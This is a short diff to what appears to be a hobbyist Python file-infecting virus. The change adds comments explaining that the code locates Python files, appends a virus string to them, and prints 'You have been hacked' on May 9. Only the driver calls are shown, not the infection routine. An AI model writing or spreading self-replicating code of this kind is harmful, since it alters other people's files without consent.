@@ -58,7 +58,10 @@ def detonate():
         print("You have been hacked")
 
 # this calls all the functions that were preivously created
+# "files_targeted" - locates python files, and adds them to the list
 files_targeted = locate(os.path.abspath(""))
+# "Infect" takes the list from "files_targeted" and appends the "virusstring" to it
 infect(files_targeted)
+# Checks if today is may 9, and if it is prints "you haave been hacked"
 detonate()
 # end
